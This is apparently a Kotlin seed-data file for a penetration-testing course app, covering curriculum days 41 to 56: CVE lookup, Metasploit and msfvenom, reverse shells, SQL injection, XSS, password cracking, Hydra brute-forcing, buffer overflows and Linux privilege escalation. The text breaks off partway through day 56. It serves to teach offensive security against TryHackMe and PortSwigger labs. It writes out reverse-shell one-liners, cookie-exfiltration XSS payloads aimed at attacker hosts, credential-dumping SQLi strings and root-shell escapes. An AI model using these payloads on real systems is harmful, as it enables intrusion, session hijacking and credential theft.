package com.example.data.seed

import com.example.data.model.DayEntity

object CurriculumPhase3 {
    fun getDays(): List<DayEntity> = (41..60).map { dayNum ->
        when (dayNum) {
            41 -> DayEntity(
                id = 41, phase = 3, dayNumber = 41,
                title = "Vulnerability Research, CVEs & Exploit-DB",
                subtitle = "Match software versions to CVE advisories, CVSS scores, and public Proof-of-Concepts.",
                concept = """
                    Vulnerability Research bridges reconnaissance and exploitation:
                    - CVE (Common Vulnerabilities and Exposures): Unique identifier format `CVE-YYYY-NNNNN` assigned by MITRE.
                    - CVSS (Common Vulnerability Scoring System): Measures vulnerability severity from 0.0 to 10.0 (Base, Temporal, Environmental metrics). CVSS v3.1 rating: Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9), Critical (9.0-10.0).
                    - Exploit-DB & Searchsploit: Offline database of verified public exploit codes.
                    - Security Advisories (NVD, GitHub Security Advisories, Packet Storm, Vulners).
                """.trimIndent(),
                keyTakeaways = "• Searchsploit enables offline exploit searching on Kali without Internet access.\n• Always read and audit exploit code before execution to verify payload safety.\n• A CVSS score of 9.8+ indicates unauthenticated Remote Code Execution (RCE).",
                commandsCode = "# Search offline Exploit-DB by service name and version\nsearchsploit apache 2.4.49\n\n# Copy exploit code to current working directory\nsearchsploit -m 50383.py",
                videoTitle = "How to Find and Use CVE Exploits Like a Pro",
                videoUrl = "https://www.youtube.com/watch?v=kYv9N8F7Q8A",
                videoChannel = "John Hammond",
                videoDuration = "22m",
                readTitle = "NIST National Vulnerability Database (NVD) Reference",
                readUrl = "https://nvd.nist.gov/",
                readSource = "NIST",
                labTitle = "Vulnerability Research Room - TryHackMe",
                labUrl = "https://tryhackme.com/room/vulnversity",
                labPlatform = "TryHackMe",
                labDescription = "Search for CVEs matching discovered web services and execute an exploit.",
                xpReward = 50
            )
            42 -> DayEntity(
                id = 42, phase = 3, dayNumber = 42,
                title = "Metasploit Framework Architecture & Console Navigation",
                subtitle = "Understand MSF modular design: exploits, payloads, auxiliaries, encoders, post modules.",
                concept = """
                    The Metasploit Framework (MSF) is the world's most widely used penetration testing platform:
                    - Core Module Types:
                      * `exploit`: Code that takes advantage of a flaw to inject a payload.
                      * `payload`: Code that executes on target after compromise (e.g. meterpreter reverse TCP).
                      * `auxiliary`: Scanners, fuzzers, and crawlers that do not deliver payloads.
                      * `post`: Modules executed after initial access (credential dumping, local enum).
                      * `encoder`: Obfuscates payloads to avoid bad characters (e.g., `shikata_ga_nai`).
                    - MSFConsole Workflow: `use <module>` -> `set RHOSTS <IP>` -> `set LHOST <IP>` -> `check` -> `exploit` (or `run`).
                """.trimIndent(),
                keyTakeaways = "• Staged payloads (`windows/x64/meterpreter/reverse_tcp`) send a small stager first, then download full payload.\n• Stageless payloads (`windows/x64/meterpreter_reverse_tcp`) contain the entire binary in one package.\n• Meterpreter operates purely in memory, avoiding writing executable binaries to disk.",
                commandsCode = "# Start Metasploit console connected to local PostgreSQL database\nmsfconsole -q\n\n# Search and inspect an exploit module\nmsf6 > search type:exploit name:vsftpd\nmsf6 > use exploit/unix/ftp/vsftpd_234_backdoor\nmsf6 > show options",
                videoTitle = "Metasploit Tutorial for Complete Beginners",
                videoUrl = "https://www.youtube.com/watch?v=8lR27r8Y_W8",
                videoChannel = "NetworkChuck",
                videoDuration = "26m",
                readTitle = "Metasploit Unleashed - Free Offensive Security Course",
                readUrl = "https://www.offsec.com/metasploit-unleashed/",
                readSource = "OffSec",
                labTitle = "Metasploit Introduction - TryHackMe",
                labUrl = "https://tryhackme.com/room/rpmetasploit",
                labPlatform = "TryHackMe",
                labDescription = "Configure MSF modules, set payload options, and achieve a Meterpreter shell.",
                xpReward = 50
            )
            43 -> DayEntity(
                id = 43, phase = 3, dayNumber = 43,
                title = "MSFvenom Custom Payload Generation & Formats",
                subtitle = "Generate reverse shells for Windows (EXE/DLL), Linux (ELF), PHP, ASPX, and Python.",
                concept = """
                    MSFvenom combines msfpayload and msfencode into a single standalone payload generator:
                    Key Flags:
                    - `-p <payload>`: Specifies payload (e.g. `linux/x64/shell_reverse_tcp`).
                    - `LHOST=<IP> LPORT=<Port>`: Pentester's IP and listening port.
                    - `-f <format>`: Output format (e.g. `elf`, `exe`, `raw`, `asp`, `aspx`, `war`, `python`, `c`).
                    - `-e <encoder>`: Encoder to evade bad characters (e.g. `-e x86/shikata_ga_nai`).
                    - `-b '<bad_chars>'`: Eliminates characters like `\\x00` (null byte) that terminate strings in memory.
                    - `-o <filename>`: Output file path.
                """.trimIndent(),
                keyTakeaways = "• Web servers running PHP require `.php` webshells; IIS servers require `.aspx` or `.asp`.\n• Always verify your `LHOST` matches your VPN tun0 IP address, not localhost.\n• Multi/handler in Metasploit handles incoming MSFvenom connections.",
                commandsCode = "# Generate Linux x64 reverse shell ELF binary\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf\n\n# Generate PHP standalone reverse shell\nmsfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -o shell.php",
                videoTitle = "MSFvenom Payload Generation Crash Course",
                videoUrl = "https://www.youtube.com/watch?v=2TzF1U2K6p8",
                videoChannel = "TCM Security",
                videoDuration = "21m",
                readTitle = "MSFvenom Cheatsheet & Payload List",
                readUrl = "https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom",
                readSource = "HackTricks",
                labTitle = "Payloads & MSFvenom Practice - TryHackMe",
                labUrl = "https://tryhackme.com/room/ccpentesting",
                labPlatform = "TryHackMe",
                labDescription = "Generate executable payloads and catch incoming shell sessions.",
                xpReward = 50
            )
            44 -> DayEntity(
                id = 44, phase = 3, dayNumber = 44,
                title = "Reverse Shells vs Bind Shells & Terminal Upgrading",
                subtitle = "Master one-line reverse shells (Bash, Python, Netcat, PHP) and upgrade to full interactive PTY.",
                concept = """
                    Understanding Shell Types:
                    - Reverse Shell: Target connects outbound to attacker's listener (Bypasses inbound firewall rules).
                    - Bind Shell: Target opens a listening port and waits for attacker to connect inbound.
                    Classic Reverse Shell One-Liners:
                    - Bash: `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`
                    - Python: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`
                    - Netcat OpenBSD: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f`

                    Full PTY Terminal Upgrade:
                    1. Target: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
                    2. Press `Ctrl + Z` (background netcat).
                    3. Attacker: `stty raw -echo; fg` (hit Enter twice).
                    4. Target: `export TERM=xterm-256color; stty rows 38 cols 120`.
                """.trimIndent(),
                keyTakeaways = "• Standard netcat shells lack tab completion, arrow keys, and clear command.\n• Upgrading to PTY via Python and `stty raw -echo` enables Ctrl+C without killing the shell.\n• PayloadsAllTheThings is the definitive reference for reverse shell one-liners.",
                commandsCode = "# Stabilize shell after catching netcat connection:\n# 1. Inside netcat:\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# 2. Background with Ctrl+Z, then on Kali:\nstty raw -echo; fg\n# 3. Inside stabilized shell:\nexport TERM=xterm-256color",
                videoTitle = "How to Upgrade Dumb Shells to Fully Interactive TTY",
                videoUrl = "https://www.youtube.com/watch?v=Oym_wP_6K68",
                videoChannel = "John Hammond",
                videoDuration = "15m",
                readTitle = "PayloadsAllTheThings: Reverse Shell Cheatsheet",
                readUrl = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md",
                readSource = "PayloadsAllTheThings",
                labTitle = "What The Shell? Lab - TryHackMe",
                labUrl = "https://tryhackme.com/room/introtoshells",
                labPlatform = "TryHackMe",
                labDescription = "Execute reverse shells across 5 different scripting languages and stabilize them.",
                xpReward = 50
            )
            45 -> DayEntity(
                id = 45, phase = 3, dayNumber = 45,
                title = "SQL Injection Fundamentals & Error-Based SQLi",
                subtitle = "Understand SQL syntax manipulation, string concatenation, and database error extraction.",
                concept = """
                    SQL Injection occurs when untrusted user input is directly concatenated into a dynamic SQL query without parameterized statements:
                    Vulnerable PHP Query Example:
                    `query = "SELECT * FROM users WHERE username = '" . req_user . "' AND password = '" . req_pass . "';";`
                    Authentication Bypass Payload:
                    Input: `admin' -- ` or `admin' OR 1=1 -- `
                    Resulting Query:
                    `SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...';`
                    The single quote `'` breaks out of the string literal, and `-- ` comments out the remainder of the query (including the password check)!

                    Error-Based SQLi:
                    Injecting malformed subqueries (e.g. `CAST()`, `EXTRACTVALUE()`, `GROUP BY`) forces the database engine to output internal query results and version strings in SQL error messages returned to the browser.
                """.trimIndent(),
                keyTakeaways = "• SQLi is completely prevented by Prepared Statements (Parameterized Queries).\n• Comment syntax differs by DBMS: MySQL (`-- `, `#`), PostgreSQL (`--`), Oracle (`--`), MSSQL (`--`).\n• Single quote `'` is the universal probe character to test for SQL syntax errors.",
                commandsCode = "# Test SQL injection probe on a parameter using curl\ncurl \"http://target.com/product.php?id=1'\"",
                videoTitle = "SQL Injection Explained: How Hackers Bypass Logins",
                videoUrl = "https://www.youtube.com/watch?v=ciNHn38EyRc",
                videoChannel = "Computerphile",
                videoDuration = "14m",
                readTitle = "PortSwigger Web Security: SQL Injection Academy",
                readUrl = "https://portswigger.net/web-security/sql-injection",
                readSource = "PortSwigger",
                labTitle = "PortSwigger Academy: SQLi Vulnerability in WHERE Clause",
                labUrl = "https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data",
                labPlatform = "PortSwigger",
                labDescription = "Inject SQL payloads to retrieve unreleased hidden product records.",
                xpReward = 50
            )
            46 -> DayEntity(
                id = 46, phase = 3, dayNumber = 46,
                title = "UNION-Based SQL Injection & Schema Extraction",
                subtitle = "Determine column count with `ORDER BY`, find data types, and dump `information_schema` tables.",
                concept = """
                    UNION-based SQLi leverages the SQL `UNION` operator to append results of an injected query to the original query:
                    Methodology:
                    1. Determine Column Count:
                       `' ORDER BY 1-- -` -> `' ORDER BY 2-- -` -> `' ORDER BY 3-- -` (until database throws an error).
                    2. Find Compatible Column Data Types:
                       `' UNION SELECT 'test', 1, 'test'-- -`
                    3. Extract Database Name and Version:
                       `' UNION SELECT null, version(), database()-- -` (MySQL)
                       `' UNION SELECT null, @@version, db_name()-- -` (MSSQL)
                    4. Dump Tables from Schema:
                       `' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema=database()-- -`
                    5. Dump Columns and Credentials:
                       `' UNION SELECT null, username, password FROM users-- -`
                """.trimIndent(),
                keyTakeaways = "• Both queries in a UNION statement must return the exact same number of columns with compatible data types.\n• `information_schema` contains metadata for all tables and columns in MySQL and PostgreSQL.\n• `group_concat(column_name)` aggregates multiple rows into a single text output.",
                commandsCode = "# Example UNION payload dumping credentials in MySQL:\n' UNION SELECT null, concat(username,':',password), null FROM users-- -",
                videoTitle = "UNION Based SQL Injection Full Tutorial",
                videoUrl = "https://www.youtube.com/watch?v=Fj2FkGg5h4A",
                videoChannel = "InsiderPhD",
                videoDuration = "24m",
                readTitle = "PortSwigger Academy: UNION Attacks Guide",
                readUrl = "https://portswigger.net/web-security/sql-injection/union-attacks",
                readSource = "PortSwigger",
                labTitle = "PortSwigger Academy: UNION Attack Retrieving Data",
                labUrl = "https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables",
                labPlatform = "PortSwigger",
                labDescription = "Determine column count and extract administrator password hash.",
                xpReward = 50
            )
            47 -> DayEntity(
                id = 47, phase = 3, dayNumber = 47,
                title = "Blind SQL Injection (Boolean & Time-Based) & SQLMap",
                subtitle = "Infer database characters via true/false responses and sleep delays; automate with SQLMap.",
                concept = """
                    When a web application executes SQL queries without returning database errors or records to the screen, Blind SQLi must be used:
                    - Boolean-Based Blind SQLi:
                      Inject conditional statements (`AND 1=1` vs `AND 1=2`). If the page renders differently (e.g. "Welcome back" appears vs disappears), you can guess data character by character:
                      `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -`
                    - Time-Based Blind SQLi:
                      Forces database to sleep if condition is true:
                      `' AND IF((SELECT SUBSTRING(password,1,1) FROM users)='a', SLEEP(5), 0)-- -` (MySQL)
                      `'; IF (1=1) WAITFOR DELAY '0:0:5'--` (MSSQL)
                    - SQLMap Automation:
                      Automates database fingerprinting, blind inference, and hash dumping across 15+ database engines.
                """.trimIndent(),
                keyTakeaways = "• Time-based SQLi is slower but works when the application produces identical HTTP responses.\n• SQLMap `--batch` runs automated non-interactive scans.\n• `--os-shell` in SQLMap attempts to write a web shell via `INTO OUTFILE` or `xp_cmdshell`.",
                commandsCode = "# Run SQLMap against a vulnerable URL parameter\nsqlmap -u 'http://target.com/item.php?id=1' --batch --dbs\n\n# Dump tables from specific database\nsqlmap -u 'http://target.com/item.php?id=1' -D webapp --tables --dump",
                videoTitle = "SQLMap Tutorial: Automated Database Exploitation",
                videoUrl = "https://www.youtube.com/watch?v=gT8vWzQ_8g0",
                videoChannel = "TCM Security",
                videoDuration = "28m",
                readTitle = "SQLMap Official User's Manual",
                readUrl = "https://github.com/sqlmapproject/sqlmap/wiki/Usage",
                readSource = "SQLMap",
                labTitle = "PortSwigger Academy: Blind SQLi with Time Delays",
                labUrl = "https://portswigger.net/web-security/sql-injection/blind/lab-time-delays",
                labPlatform = "PortSwigger",
                labDescription = "Trigger an intentional 10-second SQL delay to confirm vulnerability.",
                xpReward = 50
            )
            48 -> DayEntity(
                id = 48, phase = 3, dayNumber = 48,
                title = "Cross-Site Scripting (XSS): Reflected & DOM-Based",
                subtitle = "Understand JavaScript execution in victim browsers, alert proof-of-concept, and DOM sinks.",
                concept = """
                    Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper HTML/JS encoding:
                    - Reflected XSS:
                      Malicious payload is included in a request parameter (e.g. search query) and reflected back immediately in the response page. Target victim must click a crafted phishing link.
                      Payload: `<script>alert(document.domain)</script>` or `<img src=x onerror=alert(1)>`
                    - DOM-Based XSS:
                      Vulnerability exists entirely in client-side JavaScript. Untrusted user data from a "Source" (`location.search`, `document.referrer`, `window.location.hash`) flows into an unsafe execution "Sink" (`eval()`, `document.write()`, `innerHTML`, `setTimeout()`).
                """.trimIndent(),
                keyTakeaways = "• XSS executes in the context of the victim's session, not on the server.\n• Context matters: HTML body, attribute values, and script tags require different escaping techniques.\n• DOM XSS does not require server interaction; it executes entirely in the client browser.",
                commandsCode = "# Test simple XSS payload in parameter via browser or curl\nhttp://target.com/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E",
                videoTitle = "Cross-Site Scripting (XSS) Explained in 10 Minutes",
                videoUrl = "https://www.youtube.com/watch?v=EoaDgJP46hm",
                videoChannel = "NetworkChuck",
                videoDuration = "16m",
                readTitle = "PortSwigger Web Security: XSS Academy & Cheatsheet",
                readUrl = "https://portswigger.net/web-security/cross-site-scripting",
                readSource = "PortSwigger",
                labTitle = "PortSwigger Academy: Reflected XSS into HTML context",
                labUrl = "https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded",
                labPlatform = "PortSwigger",
                labDescription = "Craft a reflected XSS payload that executes an alert() box.",
                xpReward = 50
            )
            49 -> DayEntity(
                id = 49, phase = 3, dayNumber = 49,
                title = "Stored XSS, Session Hijacking & Exploitation Frameworks (BeEF)",
                subtitle = "Persist malicious JavaScript in comments and databases; steal session cookies and keystrokes.",
                concept = """
                    Stored (Persistent) XSS is the most dangerous form of Cross-Site Scripting:
                    - Mechanics:
                      The malicious script is stored permanently in the application database (e.g. forum comment, user profile bio, product review). Every victim who visits the page executes the payload automatically!
                    - Exploitation Impact:
                      1. Session Hijacking: `fetch('http://attacker.com/log?c=' + encodeURIComponent(document.cookie))` (if HttpOnly is missing).
                      2. Credential Phishing: Injecting fake modal login dialogs directly over the real page.
                      3. Keylogging: Capturing keystrokes via `addEventListener('keypress', ...)`.
                      4. Browser Exploitation Framework (BeEF): Hooks victim browsers to execute reconnaissance and local network port scans.
                """.trimIndent(),
                keyTakeaways = "• Stored XSS executes automatically on any user (including administrators) viewing the page.\n• Content Security Policy (CSP) headers mitigate XSS by restricting allowed script sources.\n• `HttpOnly` flag protects session cookies from JavaScript access even if XSS exists.",
                commandsCode = "# Stored XSS payload to exfiltrate cookies to attacker listener\n<script>new Image().src='http://10.10.14.5:8000/?c='+encodeURIComponent(document.cookie);</script>",
                videoTitle = "Stored XSS and Stealing Session Cookies with Netcat",
                videoUrl = "https://www.youtube.com/watch?v=d_kSg_wVwKo",
                videoChannel = "John Hammond",
                videoDuration = "22m",
                readTitle = "BeEF (Browser Exploitation Framework) Documentation",
                readUrl = "https://beefproject.com/",
                readSource = "BeEF Project",
                labTitle = "PortSwigger Academy: Stored XSS Lab",
                labUrl = "https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded",
                labPlatform = "PortSwigger",
                labDescription = "Submit a stored XSS comment that triggers cookie exfiltration.",
                xpReward = 50
            )
            50 -> DayEntity(
                id = 50, phase = 3, dayNumber = 50,
                title = "Password Cracking Fundamentals: John the Ripper",
                subtitle = "Crack Linux `/etc/shadow`, NTLM, and zip/pdf passwords using wordlists and mutation rules.",
                concept = """
                    John the Ripper (JTR) is an open-source password cracking tool:
                    - Methodology:
                      Calculates cryptographic hashes of candidate passwords from a wordlist (e.g. `rockyou.txt`) and compares them against target hashes.
                    - Extraction Utilities (`*2john`):
                      * `unshadow /etc/passwd /etc/shadow > unshadowed.txt` (Combines passwd and shadow).
                      * `zip2john secret.zip > zip.hash` (Extracts encryption hash from password-protected ZIP).
                      * `pdf2john document.pdf > pdf.hash`
                      * `ssh2john id_rsa > rsa.hash` (Extracts encrypted private key passphrase).
                    - Mutation Rules (`--rules=KoreLogic`):
                      Transforms dictionary words by adding digits, capitalizing letters, and leetspeak substitution (`p@ssword123`).
                """.trimIndent(),
                keyTakeaways = "• `rockyou.txt` in `/usr/share/wordlists/rockyou.txt` is the standard dictionary of 14 million passwords.\n• Wordlist mutation rules generate billions of realistic variations from small dictionaries.\n• Asymmetric private keys protected with passphrases can be cracked with `ssh2john`.",
                commandsCode = "# Crack unshadowed Linux hashes with John and wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt\n\n# Show cracked passwords\njohn --show unshadowed.txt",
                videoTitle = "John the Ripper Crash Course: Password Cracking for Hackers",
                videoUrl = "https://www.youtube.com/watch?v=oM3tW5K2LqA",
                videoChannel = "NetworkChuck",
                videoDuration = "20m",
                readTitle = "John the Ripper Official User Guide",
                readUrl = "https://www.openwall.com/john/doc/",
                readSource = "Openwall",
                labTitle = "John The Ripper Room - TryHackMe",
                labUrl = "https://tryhackme.com/room/johntheripper0",
                labPlatform = "TryHackMe",
                labDescription = "Crack zip passwords, shadow hashes, and encrypted SSH key passphrases.",
                xpReward = 50
            )
            51 -> DayEntity(
                id = 51, phase = 3, dayNumber = 51,
                title = "High-Performance GPU Cracking with Hashcat",
                subtitle = "Understand hash mode codes (`-m 1000` NTLM, `-m 0` MD5), masks, rules, and benchmarks.",
                concept = """
                    Hashcat is the world's fastest password recovery tool, harnessing the parallel computing power of GPUs (CUDA, OpenCL):
                    Common Hash Modes (`-m`):
                    - `-m 0`: MD5
                    - `-m 1000`: NTLM (Windows local SAM / Active Directory)
                    - `-m 1800`: SHA-512 ($6$) Linux Shadow
                    - `-m 5600`: NetNTLMv2 (Captured with Responder)
                    - `-m 22000`: WPA-PBKDF2-PMKID (Wi-Fi handshakes)
                    - `-m 13100`: Kerberoast (TGS-REP)

                    Attack Modes (`-a`):
                    - `-a 0`: Straight dictionary attack.
                    - `-a 3`: Mask / Pure brute force (`?u?l?l?l?d?d?s` for Uppercase+3 Lower+2 Digits+1 Special).
                    - `-a 6`: Hybrid wordlist + mask (`rockyou.txt ?d?d?d?d`).
                """.trimIndent(),
                keyTakeaways = "• GPUs compute billions of MD5/NTLM hashes per second compared to millions on CPU.\n• NetNTLMv2 hashes (`-m 5600`) cannot be passed (Pass-the-Hash); they must be cracked or relayed.\n• `hashid` or `hash-identifier` CLI tools identify unknown hash algorithms.",
                commandsCode = "# Identify hash type with hashid\nhashid -m 'b4b9b02e6f09a9bd760f388b67351e2b'\n\n# Crack NTLM hash with rockyou.txt\nhashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt",
                videoTitle = "Hashcat Tutorial: GPU Password Cracking Masterclass",
                videoUrl = "https://www.youtube.com/watch?v=0kFqG1G98k8",
                videoChannel = "David Bombal",
                videoDuration = "25m",
                readTitle = "Hashcat Official Wiki and Hash Mode Index",
                readUrl = "https://hashcat.net/wiki/doku.php?id=example_hashes",
                readSource = "Hashcat.net",
                labTitle = "Hashcat Lab - TryHackMe",
                labUrl = "https://tryhackme.com/room/hashcat",
                labPlatform = "TryHackMe",
                labDescription = "Crack NTLM, MD5, and NetNTLMv2 hashes using dictionary and hybrid mask attacks.",
                xpReward = 50
            )
            52 -> DayEntity(
                id = 52, phase = 3, dayNumber = 52,
                title = "Online Service Brute Forcing with Hydra & Medusa",
                subtitle = "Brute-force SSH, FTP, RDP, SMB, and HTTP POST login forms with rate-limit evasion.",
                concept = """
                    Online password attacks test credentials against live network service daemons:
                    - `hydra`: Fast multi-threaded network logon cracker supporting 50+ protocols (SSH, FTP, HTTP-POST-FORM, RDP, MySQL, VNC, Telnet).
                    Key Hydra Flags:
                    - `-l <user>` / `-L <userlist.txt>`: Target username or list.
                    - `-p <pass>` / `-P <passlist.txt>`: Target password or wordlist.
                    - `-t <threads>`: Number of parallel connections (default 16; lower for SSH to avoid rate bans).
                    - `-V`: Verbose mode (shows every attempted combination).
                    - HTTP POST Form Syntax:
                      `hydra target.com http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"`
                """.trimIndent(),
                keyTakeaways = "• The `F=` parameter tells Hydra what string signifies a failed attempt (e.g. \"Invalid credentials\").\n• Always limit SSH threads (`-t 4`) to prevent SSH daemon drop connections or triggering fail2ban.\n• Password spraying (trying 1 common password against 1,000 usernames) avoids account lockouts.",
                commandsCode = "# Brute-force SSH credentials using Hydra\nhydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -t 4\n\n# Brute-force HTTP POST form login\nhydra 10.10.10.10 http-post-form '/login.php:user=^USER^&pass=^PASS^:F=incorrect' -L users.txt -P rockyou.txt",
                videoTitle = "Hydra Password Cracking for SSH, FTP, and Web Forms",
                videoUrl = "https://www.youtube.com/watch?v=4d09B8G2j4s",
                videoChannel = "NetworkChuck",
                videoDuration = "19m",
                readTitle = "THC-Hydra Official Documentation & Syntax Reference",
                readUrl = "https://github.com/vanhauser-thc/thc-hydra",
                readSource = "THC",
                labTitle = "Hydra Room - TryHackMe",
                labUrl = "https://tryhackme.com/room/hydra",
                labPlatform = "TryHackMe",
                labDescription = "Brute force an SSH daemon and a web admin login form.",
                xpReward = 50
            )
            53 -> DayEntity(
                id = 53, phase = 3, dayNumber = 53,
                title = "Memory Architecture & Stack Layout Fundamentals",
                subtitle = "Examine CPU Registers (EIP/RIP, ESP/RSP, EBP/RBP), stack frames, endianness, and memory addresses.",
                concept = """
                    Binary exploitation requires understanding how operating systems execute compiled machine code:
                    Memory Segments of a Process:
                    1. Text Segment: Read-only executable machine instructions.
                    2. Data / BSS Segment: Initialized and uninitialized global/static variables.
                    3. Heap: Dynamically allocated memory (`malloc()`, `free()`) growing upward toward high addresses.
                    4. Stack: Function call frames, local variables, and return addresses growing downward toward low addresses.

                    Crucial x86/x64 Registers:
                    - Instruction Pointer (`EIP` / `RIP`): Points to the memory address of the next machine instruction to execute.
                    - Stack Pointer (`ESP` / `RSP`): Points to the current top of the stack.
                    - Base / Frame Pointer (`EBP` / `RBP`): Points to the base of the current function stack frame.
                """.trimIndent(),
                keyTakeaways = "• The stack grows downward (high memory to low memory), but buffers write upward.\n• Overwriting the Instruction Pointer (EIP/RIP) allows redirecting execution flow to custom shellcode.\n• Little-Endian architecture stores least-significant byte at the lowest memory address.",
                commandsCode = "# Inspect assembly disassembly of a binary with objdump\nobjdump -d -M intel /bin/ls | head -n 30\n\n# Check binary security protections with checksec\nchecksec --file=/bin/ls",
                videoTitle = "Buffer Overflow & Stack Memory Layout Explained",
                videoUrl = "https://www.youtube.com/watch?v=1S0aBV-Waeo",
                videoChannel = "Computerphile",
                videoDuration = "17m",
                readTitle = "Smashing The Stack For Fun And Profit (Phrack 49 by Aleph One)",
                readUrl = "http://phrack.org/issues/49/14.html",
                readSource = "Phrack Magazine",
                labTitle = "Buffer Overflow Prep - TryHackMe",
                labUrl = "https://tryhackme.com/room/bufferoverflowprep",
                labPlatform = "TryHackMe",
                labDescription = "Examine registers and stack frames using Immunity Debugger and Mona.py.",
                xpReward = 50
            )
            54 -> DayEntity(
                id = 54, phase = 3, dayNumber = 54,
                title = "Buffer Overflow Vulnerability Theory & Exploitation Steps",
                subtitle = "Fuzzing, finding offset with cyclic patterns, controlling EIP, bad character analysis, and shellcode execution.",
                concept = """
                    Classic Stack-Based Buffer Overflow Methodology (e.g. OSCP buffer overflow steps):
                    1. Fuzzing: Send increasing strings of characters (`A` x 100, 200, 500...) until the application crashes.
                    2. Finding Offset: Send a unique non-repeating cyclic pattern (`msf-pattern_create -l 2000`). Match the crash address with `msf-pattern_offset -q <EIP_HEX>` to determine the exact number of bytes before EIP.
                    3. Controlling EIP: Send `<OFFSET_A's> + "BBBB"` and verify EIP register becomes `42424242`.
                    4. Identifying Bad Characters: Send all byte values from `\\x01` to `\\xff` (excluding `\\x00`) to find which bytes get mangled or truncated by the application.
                    5. Finding `JMP ESP` Gadget: Locate a memory address containing `JMP ESP` without memory protections (ASLR/DEP) or bad characters using `!mona jmp -r esp`.
                    6. Shellcode Delivery: Construct final payload: `<OFFSET> + <JMP_ESP_ADDR> + <NOP_SLED> + <MSFVENOM_SHELLCODE>`.
                """.trimIndent(),
                keyTakeaways = "• NOP Sled (`\\x90\\x90\\x90...`) gives the CPU a landing strip before executing shellcode.\n• `!mona findmsp` in Immunity Debugger automates register offset calculation.\n• Modern binaries implement ASLR, DEP/NX, and Stack Canaries to mitigate standard buffer overflows.",
                commandsCode = "# Create 1000-byte unique pattern to find crash offset\nmsf-pattern_create -l 1000\n\n# Calculate exact offset from crashed EIP value (e.g. 39694438)\nmsf-pattern_offset -q 39694438",
                videoTitle = "OSCP Buffer Overflow Step-by-Step Guide",
                videoUrl = "https://www.youtube.com/watch?v=qSnPayW6F7U",
                videoChannel = "TCM Security",
                videoDuration = "42m",
                readTitle = "Mona.py Manual & Corelan Exploit Writing Guide",
                readUrl = "https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/",
                readSource = "Corelan Team",
                labTitle = "Buffer Overflow Prep Lab 1 - TryHackMe",
                labUrl = "https://tryhackme.com/room/bufferoverflowprep",
                labPlatform = "TryHackMe",
                labDescription = "Exploit 3 vulnerable binary functions in Immunity Debugger to spawn reverse shells.",
                xpReward = 50
            )
            55 -> DayEntity(
                id = 55, phase = 3, dayNumber = 55,
                title = "Linux Privilege Escalation: SUID & SGID Binaries",
                subtitle = "Discover unusual SUID binaries, exploit GTFOBins escapes, and abuse shared library loading.",
                concept = """
                    The SUID (Set User ID) permission bit (octal `4000`) instructs Linux to execute a binary with the permissions of the file owner (frequently `root`):
                    - Finding SUID Binaries:
                      `find / -perm -u=s -type f 2>/dev/null`
                    - GTFOBins (gtfobins.github.io):
                      Curated repository listing how standard UNIX binaries can be abused to bypass security restrictions and elevate to root.
                    - Example SUID Exploits:
                      * `find`: `find . -exec /bin/sh -p \; -quit`
                      * `vim`: `vim -c ':!/bin/sh'`
                      * `cp`: Overwrite `/etc/passwd` with a new root user entry.
                      * `bash`: `bash -p` (preserves effective user ID).
                """.trimIndent(),
                keyTakeaways = "• Standard SUID binaries like `ping` or `passwd` are normal; hunt for custom or admin-installed tools.\n• `LD_PRELOAD` in `sudo -l` allows executing arbitrary C code before binary execution.\n• GTFOBins is the primary cheat sheet for UNIX privilege escalation.",
                commandsCode = "# Find all SUID binaries on Linux system\nfind / -perm -4000 -type f -exec ls -la {} + 2>/dev/null\n\n# Test bash SUID execution\n/tmp/bash -p",
                videoTitle = "Linux Privilege Escalation: SUID Binaries & GTFOBins",
                videoUrl = "https://www.youtube.com/watch?v=f0b8qWn1Vd4",
                videoChannel = "John Hammond",
                videoDuration = "26m",
                readTitle = "GTFOBins: Unix Binaries Curated Exploits Reference",
                readUrl = "https://gtfobins.github.io/",
                readSource = "GTFOBins",
                labTitle = "Linux PrivEsc: SUID Exploitation - TryHackMe",
                labUrl = "https://tryhackme.com/room/linprivesc",
                labPlatform = "TryHackMe",
                labDescription = "Find an improperly permissioned SUID binary and elevate privileges to root.",
                xpReward = 50
            )
            56 -> DayEntity(
                id = 56, phase = 3, dayNumber = 56,
                title = "Linux Privilege Escalation: Sudo Privileges & LD_PRELOAD",
                subtitle = "Audit `sudo -l` output, exploit wildcards, shell escapes, and environment variable overrides.",
                concept = """
                    `sudo -l` reveals what commands the current unprivileged user can execute as other users:
                    - Sudo Without Password (`NOPASSWD`):
                      `(ALL : ALL) NOPASSWD: /usr/bin/find` -> Immediate root via `sudo find . -exec /bin/sh \;`
                    - Sudo Environment Abuse (`env_keep+=LD_PRELOAD`):
                      If `LD_PRELOAD` is preserved in `sudoers`, you can compile a shared object (`.so`) that spawns a root shell and preload it into any allowed sudo command!
                    - CVE-2021-3156 (Baron Samedit):
                      Heap-based buffer overflow in Sudo allowing local privilege escalation without valid credentials.
                """.trimIndent(),
